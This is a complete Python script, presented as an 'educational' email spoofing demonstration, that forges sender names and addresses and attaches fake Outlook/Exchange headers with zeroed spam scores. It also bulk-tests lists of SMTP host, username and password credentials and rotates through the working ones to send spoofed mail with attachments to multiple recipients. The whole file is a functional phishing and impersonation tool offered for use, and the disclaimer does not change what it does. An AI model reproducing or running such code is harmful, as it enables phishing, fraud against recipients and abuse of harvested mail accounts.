#!/usr/bin/env python3
"""
Advanced Email Spoofing Demonstration
This script demonstrates advanced email spoofing techniques for educational purposes only.

Developed by Triotion (https://t.me/Triotion)
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage
from email.utils import formataddr, formatdate, make_msgid
import argparse
import sys
import os
import uuid
import socket
import random
import struct
import threading
import time
import concurrent.futures
import codecs
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class EmailSpoofer:
    def __init__(self, smtp_server, smtp_port, username, password, debug_level=0):
        """
        Initialize EmailSpoofer with SMTP connection details
        
        Args:
            smtp_server (str): SMTP server address
            smtp_port (int): SMTP server port 
            username (str): SMTP authentication username
            password (str): SMTP authentication password
            debug_level (int): SMTP debug level (0-2)
        """
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.debug_level = debug_level
        
    def create_message(self, from_name, from_email, reply_to=None, 
                      to_email=None, cc=None, bcc=None, subject=None, 
                      message=None, html=True, attachments=None):
        """
        Create a message with spoofed headers
        
        Args:
            from_name (str): Display name for the spoofed sender
            from_email (str): Email address shown as the sender
            reply_to (str, optional): Reply-to email address
            to_email (str/list): Recipient email address or list of addresses
            cc (str/list, optional): CC email address or list of addresses
            bcc (str/list, optional): BCC email address or list of addresses
            subject (str, optional): Email subject
            message (str, optional): Email body content
            html (bool): If True, content is HTML; if False, plain text
            attachments (list, optional): List of file paths to attach
            
        Returns:
            MIMEMultipart: The email message object
        """
        # Create message container
        msg = MIMEMultipart('alternative')
        
        # Set basic headers
        msg['Message-ID'] = make_msgid(domain=from_email.split('@')[1])
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = subject or ''
        msg['From'] = formataddr((from_name, from_email))
        
        # Handle recipients
        if to_email:
            if isinstance(to_email, list):
                msg['To'] = ', '.join(to_email)
            else:
                msg['To'] = to_email
                
        # Add CC if specified
        if cc:
            if isinstance(cc, list):
                msg['Cc'] = ', '.join(cc)
            else:
                msg['Cc'] = cc
                
        # Set Reply-To if specified
        if reply_to:
            msg['Reply-To'] = reply_to
            
        # Set content type based on html flag
        if message:
            if html:
                msg.attach(MIMEText(message, 'html'))
            else:
                msg.attach(MIMEText(message, 'plain'))
        
        # Add attachments if any
        if attachments:
            for attachment in attachments:
                if os.path.exists(attachment):
                    with open(attachment, 'rb') as f:
                        file_attachment = MIMEApplication(f.read())
                        
                    # Add header with filename
                    filename = os.path.basename(attachment)
                    file_attachment.add_header('Content-Disposition', 
                                             'attachment', 
                                             filename=filename)
                    msg.attach(file_attachment)
        
        return msg
    
    def add_custom_headers(self, msg, headers):
        """
        Add custom headers to email message
        
        Args:
            msg (MIMEMultipart): Email message object
            headers (dict): Dictionary of headers to add
            
        Returns:
            MIMEMultipart: Updated email message
        """
        for header, value in headers.items():
            msg[header] = value
            
        return msg
    
    def spoof_x_headers(self, msg, target_domain=None):
        """
        Add fake X-headers to make email look more legitimate
        
        Args:
            msg (MIMEMultipart): Email message object
            target_domain (str, optional): Domain to mimic
            
        Returns:
            MIMEMultipart: Updated email message
        """
        from_email = msg['From'].split('<')[1].split('>')[0]
        domain = target_domain or from_email.split('@')[1]
        
        # Add common X-headers seen in legitimate emails
        x_headers = {
            'X-Mailer': random.choice(['Outlook', 'Apple Mail', 'Gmail', 'Yahoo Mail']),
            'X-Originating-IP': f'[{socket.inet_ntoa(struct.pack("!L", random.randint(1, 0xffffffff)))}]',
            'X-Sender': from_email,
            'X-Priority': '3',
            'X-MSMail-Priority': 'Normal',
            'X-MimeOLE': f'Produced By Microsoft MimeOLE V6.{random.randint(0, 99)}.{random.randint(1000, 9999)}.{random.randint(0, 99)}',
            'X-Transport': f'{domain}.mail.protection.outlook.com',
            'X-Forefront-Antispam-Report': f'CIP:{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)};CTRY:US;LANG:en;',
            'X-MS-Exchange-Organization-SCL': '0',
            'X-MS-Exchange-Organization-PCL': '0',
            'X-MS-Exchange-Transport-CrossTenantHeadersStamped': domain,
            'X-Entity-ID': str(uuid.uuid4())
        }
        
        for header, value in x_headers.items():
            msg[header] = value
            
        return msg
    
    def send_email(self, msg, recipients):
        """
        Send the email message
        
        Args:
            msg (MIMEMultipart): Email message object
            recipients (list/str): List of recipient email addresses or single address
            
        Returns:
            tuple: (success, error_message)
        """
        if isinstance(recipients, str):
            recipient_list = [recipients]
        else:
            recipient_list = recipients
            
        try:
            # Connect to SMTP server
            print(f"{Fore.YELLOW}[*] Connecting to SMTP server: {self.smtp_server}:{self.smtp_port}{Style.RESET_ALL}")
            server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=30)
            server.set_debuglevel(self.debug_level)
            
            print(f"{Fore.YELLOW}[*] Starting TLS connection...{Style.RESET_ALL}")
            server.ehlo()
            server.starttls()
            server.ehlo()
            
            # Login to SMTP server
            print(f"{Fore.YELLOW}[*] Logging in as {self.username}...{Style.RESET_ALL}")
            server.login(self.username, self.password)
            
            # Send email
            print(f"{Fore.YELLOW}[*] Sending email...{Style.RESET_ALL}")
            server.sendmail(self.username, recipient_list, msg.as_string())
            server.quit()
            
            return (True, None)
            
        except Exception as e:
            error_msg = str(e)
            print(f"{Fore.RED}[-] Error sending email: {error_msg}{Style.RESET_ALL}")
            
            # Check for common errors and provide more helpful messages
            if "451" in error_msg or "Temporary local problem" in error_msg:
                print(f"{Fore.YELLOW}[!] The server is temporarily unavailable. Try again later.{Style.RESET_ALL}")
            elif "Authentication failed" in error_msg or "535" in error_msg:
                print(f"{Fore.YELLOW}[!] Authentication failed. Check your username and password.{Style.RESET_ALL}")
            elif "Sender address rejected" in error_msg:
                print(f"{Fore.YELLOW}[!] The sender address was rejected. The account may be blocked or have sending restrictions.{Style.RESET_ALL}")
            elif "Relay denied" in error_msg or "550" in error_msg:
                print(f"{Fore.YELLOW}[!] Relay access denied. The server may not allow sending to external email addresses.{Style.RESET_ALL}")
            
            return (False, error_msg)
            
    def test_connection(self):
        """
        Test the SMTP connection
        
        Returns:
            tuple: (success, error_message)
        """
        try:
            # Connect to SMTP server
            server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=10)
            server.ehlo()
            server.starttls()
            server.ehlo()
            
            # Login to SMTP server
            server.login(self.username, self.password)
            server.quit()
            
            return (True, None)
            
        except Exception as e:
            return (False, str(e))
            
    def validate_sending(self, test_recipient=None):
        """
        Validate that the server can actually send emails
        
        Args:
            test_recipient (str, optional): Test recipient email address
            
        Returns:
            tuple: (success, error_message)
        """
        if not test_recipient:
            # If no test recipient is provided, just test login
            return self.test_connection()
            
        # Create a simple test message
        msg = MIMEMultipart('alternative')
        msg['Subject'] = "Test Email"
        msg['From'] = formataddr(("Test", self.username))
        msg['To'] = test_recipient
        msg.attach(MIMEText("This is a test email to verify sending capability.", 'plain'))
        
        # Try to send the test email
        return self.send_email(msg, test_recipient)

def load_smtp_servers(file_path):
    """
    Load SMTP server credentials from a file
    
    Args:
        file_path (str): Path to file containing SMTP credentials
        
    Returns:
        list: List of dictionaries containing SMTP credentials
    """
    servers = []
    
    try:
        # Try different encodings to handle various file formats
        encodings = ['utf-8', 'latin-1', 'cp1252', 'ascii']
        
        for encoding in encodings:
            try:
                with codecs.open(file_path, 'r', encoding=encoding) as f:
                    line_num = 0
                    for line in f:
                        line_num += 1
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                            
                        try:
                            parts = line.split('|')
                            if len(parts) >= 4:
                                servers.append({
                                    'server': parts[0].strip(),
                                    'port': int(parts[1].strip()),
                                    'username': parts[2].strip(),
                                    'password': parts[3].strip()
                                })
                        except Exception as e:
                            print(f"{Fore.YELLOW}[!] Warning: Could not parse line {line_num}: {e}{Style.RESET_ALL}")
                            continue
                
                # If we've successfully read the file, break out of the loop
                break
            except UnicodeDecodeError:
                # If this encoding doesn't work, try the next one
                if encoding == encodings[-1]:  # Last encoding in the list
                    raise
                continue
                
        print(f"{Fore.GREEN}[+] Successfully loaded {len(servers)} SMTP servers from {file_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error loading SMTP servers: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Try manually checking and fixing the file format{Style.RESET_ALL}")
        
    return servers

def test_smtp_server(server_info, show_errors=False, validate_send=False, test_recipient=None):
    """
    Test SMTP server connection
    
    Args:
        server_info (dict): Dictionary containing SMTP server credentials
        show_errors (bool): Whether to show detailed error messages
        validate_send (bool): Whether to validate sending capability
        test_recipient (str, optional): Test recipient email address for validation
        
    Returns:
        tuple: (server_info, success, error_message)
    """
    try:
        spoofer = EmailSpoofer(
            server_info['server'],
            server_info['port'],
            server_info['username'],
            server_info['password']
        )
        
        if validate_send:
            success, error_msg = spoofer.validate_sending(test_recipient)
        else:
            success, error_msg = spoofer.test_connection()
        
        return (server_info, success, error_msg)
    except Exception as e:
        return (server_info, False, str(e))

def print_banner():
    """Print tool banner"""
    banner = f"""
{Fore.CYAN}======================================================================{Style.RESET_ALL}
{Fore.CYAN}          ADVANCED EMAIL SPOOFING DEMONSTRATION TOOL{Style.RESET_ALL}
{Fore.CYAN}               FOR EDUCATIONAL PURPOSES ONLY{Style.RESET_ALL}
{Fore.CYAN}======================================================================{Style.RESET_ALL}
{Fore.GREEN}       Developed by Triotion (https://t.me/Triotion){Style.RESET_ALL}
{Fore.CYAN}======================================================================{Style.RESET_ALL}
"""
    print(banner)

def save_working_servers(working_servers, output_file):
    """
    Save working SMTP servers to a file
    
    Args:
        working_servers (list): List of working server dictionaries
        output_file (str): Path to output file
    """
    try:
        with open(output_file, 'w') as f:
            f.write("# Working SMTP Servers\n")
            f.write("# Format: host|port|username|password\n")
            f.write("# Last updated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n")
            
            for server in working_servers:
                f.write(f"{server['server']}|{server['port']}|{server['username']}|{server['password']}\n")
                
        print(f"{Fore.GREEN}[+] Saved {len(working_servers)} working servers to {output_file}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error saving working servers: {e}{Style.RESET_ALL}")

def main():
    """Parse command line arguments and send spoofed email."""
    parser = argparse.ArgumentParser(description='Advanced Email Spoofing Tool')
    
    # SMTP Settings Group
    smtp_group = parser.add_argument_group('SMTP Settings')
    
    # File or Direct SMTP arguments (mutually exclusive)
    smtp_source = smtp_group.add_mutually_exclusive_group(required=True)
    smtp_source.add_argument('--server', help='SMTP server address')
    smtp_source.add_argument('--smtp-file', help='File containing SMTP server credentials in format "host|port|username|password"')
    
    # Other SMTP arguments
    smtp_group.add_argument('--port', type=int, default=587, help='SMTP server port (default: 587)')
    smtp_group.add_argument('--user', help='SMTP username')
    smtp_group.add_argument('--password', help='SMTP password')
    smtp_group.add_argument('--debug', type=int, default=0, help='SMTP debug level (0-2)')
    smtp_group.add_argument('--test-only', action='store_true', help='Only test SMTP servers, don\'t send emails')
    smtp_group.add_argument('--validate-sending', action='store_true', help='Validate full sending capability (requires --test-email)')
    smtp_group.add_argument('--test-email', help='Email address to use for send validation')
    smtp_group.add_argument('--threads', type=int, default=5, help='Number of threads for testing SMTP servers (default: 5)')
    smtp_group.add_argument('--show-errors', action='store_true', help='Show detailed error messages when testing SMTP servers')
    smtp_group.add_argument('--max-tests', type=int, default=10, help='Maximum number of SMTP servers to test per batch (default: 10, use 0 for all)')
    smtp_group.add_argument('--batch-mode', choices=['auto', 'interactive', 'continuous'], default='auto', 
                         help='Batch processing mode: "auto" prompts if no server found, "interactive" always prompts, "continuous" tests all without prompting')
    smtp_group.add_argument('--max-attempts', type=int, default=10, help='Maximum number of send attempts (default: 10)')
    smtp_group.add_argument('--save-working', help='Save working SMTP servers to the specified file')
    
    # Spoofing Parameters
    spoof_group = parser.add_argument_group('Spoofing Parameters')
    spoof_group.add_argument('--from-name', help='Spoofed sender name')
    spoof_group.add_argument('--from-email', help='Spoofed sender email')
    spoof_group.add_argument('--reply-to', help='Reply-to email address')
    spoof_group.add_argument('--to', help='Recipient email(s), comma separated')
    spoof_group.add_argument('--cc', help='CC recipient(s), comma separated')
    spoof_group.add_argument('--bcc', help='BCC recipient(s), comma separated')
    spoof_group.add_argument('--subject', default='', help='Email subject')
    spoof_group.add_argument('--message', default='', help='Email message')
    spoof_group.add_argument('--plain-text', action='store_true', help='Send as plain text instead of HTML')
    spoof_group.add_argument('--attach', action='append', help='File(s) to attach (can be used multiple times)')
    spoof_group.add_argument('--add-xheaders', action='store_true', help='Add fake X-headers to make email look more legitimate')
    spoof_group.add_argument('--custom-header', action='append', help='Add custom header in format "Header:Value" (can be used multiple times)')
    
    args = parser.parse_args()
    
    print_banner()
    print(f"{Fore.YELLOW}[*] Advanced Email Spoofing Demonstration{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Note: This tool is for educational purposes only!{Style.RESET_ALL}")
    
    # Check if validation is requested but no test email is provided
    if args.validate_sending and not args.test_email:
        print(f"{Fore.RED}[-] Error: --validate-sending requires --test-email{Style.RESET_ALL}")
        return
    
    # Handle SMTP server testing from file
    if args.smtp_file:
        servers = load_smtp_servers(args.smtp_file)
        if not servers:
            print(f"{Fore.RED}[-] No valid SMTP servers found in file{Style.RESET_ALL}")
            return
            
        total_servers = len(servers)
        print(f"{Fore.YELLOW}[*] Total SMTP servers loaded: {total_servers}{Style.RESET_ALL}")
        
        working_servers = []
        batch_size = args.max_tests if args.max_tests > 0 else total_servers
        
        # Process servers in batches until we find working ones or run out of servers
        start_index = 0
        
        while start_index < total_servers and not working_servers:
            end_index = min(start_index + batch_size, total_servers)
            current_batch = servers[start_index:end_index]
            
            print(f"{Fore.YELLOW}[*] Testing servers {start_index+1} to {end_index} of {total_servers}...{Style.RESET_ALL}")
            
            # Test SMTP servers with threading
            test_type = "send capability" if args.validate_sending else "connection"
            print(f"{Fore.YELLOW}[*] Validating {test_type}...{Style.RESET_ALL}")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = [executor.submit(
                    test_smtp_server, 
                    server, 
                    args.show_errors, 
                    args.validate_sending, 
                    args.test_email
                ) for server in current_batch]
                
                for i, future in enumerate(concurrent.futures.as_completed(futures)):
                    server_info, success, error_msg = future.result()
                    status = f"{Fore.GREEN}[+] Working" if success else f"{Fore.RED}[-] Failed"
                    status_msg = f"{status}: {server_info['server']}:{server_info['port']} - {server_info['username']}{Style.RESET_ALL}"
                    
                    if not success and args.show_errors and error_msg:
                        status_msg += f" Error: {error_msg}"
                        
                    print(status_msg)
                    
                    if success:
                        working_servers.append(server_info)
            
            if working_servers:
                print(f"{Fore.GREEN}[+] Found {len(working_servers)} working SMTP servers{Style.RESET_ALL}")
                # If we found working servers and not in test-only mode, break out of the loop
                if not args.test_only:
                    break
            else:
                print(f"{Fore.YELLOW}[*] No working servers found in batch {start_index+1}-{end_index}{Style.RESET_ALL}")
                
                # Ask for confirmation to continue if not in test-only mode and max_tests is limited
                if not args.test_only and args.max_tests > 0 and end_index < total_servers:
                    # Different behavior based on batch mode
                    if args.batch_mode == 'continuous':
                        # In continuous mode, always continue to the next batch
                        print(f"{Fore.YELLOW}[*] Continuing to next batch (continuous mode)...{Style.RESET_ALL}")
                    elif args.batch_mode == 'interactive' or (args.batch_mode == 'auto' and not working_servers):
                        # In interactive mode or auto mode with no working servers, prompt
                        try:
                            print(f"{Fore.YELLOW}[*] Continue testing next batch of servers? (y/n){Style.RESET_ALL}")
                            response = input().strip().lower()
                            if response != 'y':
                                print(f"{Fore.YELLOW}[*] User cancelled further testing{Style.RESET_ALL}")
                                break
                        except KeyboardInterrupt:
                            print(f"{Fore.YELLOW}[*] User cancelled further testing{Style.RESET_ALL}")
                            break
            
            start_index = end_index
        
        # Save working servers if requested
        if args.save_working and working_servers:
            save_working_servers(working_servers, args.save_working)
        
        if args.test_only:
            print(f"{Fore.YELLOW}[*] Finished testing {min(total_servers, start_index)} of {total_servers} servers{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Found {len(working_servers)} working SMTP servers{Style.RESET_ALL}")
            return
            
        if not working_servers:
            print(f"{Fore.RED}[-] No working SMTP servers found after testing {min(total_servers, start_index)} servers{Style.RESET_ALL}")
            return
            
        # Check if required spoofing parameters are provided
        if not args.from_name or not args.from_email or not args.to:
            print(f"{Fore.RED}[-] Missing required spoofing parameters (--from-name, --from-email, --to){Style.RESET_ALL}")
            return
            
        # Use the working servers
        print(f"{Fore.YELLOW}[*] Using working SMTP servers for sending{Style.RESET_ALL}")
        
    else:
        # Check if required SMTP parameters are provided
        if not args.server or not args.user or not args.password:
            print(f"{Fore.RED}[-] Missing required SMTP parameters (--server, --user, --password){Style.RESET_ALL}")
            return
            
        # Check if required spoofing parameters are provided
        if not args.from_name or not args.from_email or not args.to:
            print(f"{Fore.RED}[-] Missing required spoofing parameters (--from-name, --from-email, --to){Style.RESET_ALL}")
            return
            
        # Create a single server entry
        working_servers = [{
            'server': args.server,
            'port': args.port,
            'username': args.user,
            'password': args.password
        }]
    
    # Parse recipients
    to_list = [email.strip() for email in args.to.split(',')] if args.to else None
    cc_list = [email.strip() for email in args.cc.split(',')] if args.cc else None
    bcc_list = [email.strip() for email in args.bcc.split(',')] if args.bcc else None
    
    # Create message
    msg = None
    all_recipients = []
    
    # Get all recipients for sending
    if to_list:
        all_recipients.extend(to_list)
    if cc_list:
        all_recipients.extend(cc_list)
    if bcc_list:
        all_recipients.extend(bcc_list)
    
    # Create the message
    print(f"{Fore.YELLOW}[*] Creating email message...{Style.RESET_ALL}")
    msg = EmailSpoofer(None, None, None, None).create_message(
        args.from_name,
        args.from_email,
        args.reply_to or args.from_email,  # Default reply-to to from_email if not specified
        to_list,
        cc_list,
        None,  # BCC is handled differently, not in headers
        args.subject,
        args.message,
        not args.plain_text,
        args.attach
    )
    
    # Add custom headers if specified
    if args.custom_header:
        custom_headers = {}
        for header_str in args.custom_header:
            if ':' in header_str:
                key, value = header_str.split(':', 1)
                custom_headers[key.strip()] = value.strip()
        
        if custom_headers:
            msg = EmailSpoofer(None, None, None, None).add_custom_headers(msg, custom_headers)
    
    # Add fake X-headers if specified
    if args.add_xheaders:
        msg = EmailSpoofer(None, None, None, None).spoof_x_headers(msg)
    
    # Send email
    print(f"{Fore.YELLOW}[*] Sending spoofed email from {args.from_name} <{args.from_email}>{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] To: {', '.join(all_recipients)}{Style.RESET_ALL}")
    
    # Try sending with each working server until success or max attempts reached
    max_attempts = min(args.max_attempts, len(working_servers))
    
    for attempt in range(max_attempts):
        server_info = working_servers[attempt % len(working_servers)]
        print(f"{Fore.YELLOW}[*] Attempt {attempt+1}/{max_attempts} using SMTP server: {server_info['server']}:{server_info['port']} - {server_info['username']}{Style.RESET_ALL}")
        
        # Initialize spoofer with the current server
        spoofer = EmailSpoofer(
            server_info['server'],
            server_info['port'],
            server_info['username'],
            server_info['password'],
            args.debug
        )
        
        success, error_msg = spoofer.send_email(msg, all_recipients)
        if success:
            print(f"{Fore.GREEN}[+] Email sent successfully!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}[-] Failed to send email (attempt {attempt+1}/{max_attempts}){Style.RESET_ALL}")
            
            # Check if we've tried all servers
            if attempt == max_attempts - 1:
                print(f"{Fore.RED}[-] Failed to send email after {max_attempts} attempts with {len(working_servers)} different servers{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Try different SMTP servers or check recipient address{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[*] Trying next server...{Style.RESET_ALL}")
                time.sleep(1)  # Small delay between attempts

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Operation cancelled by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[-] An error occurred: {e}{Style.RESET_ALL}")
        if '--debug' in sys.argv:
            import traceback
            traceback.print_exc() 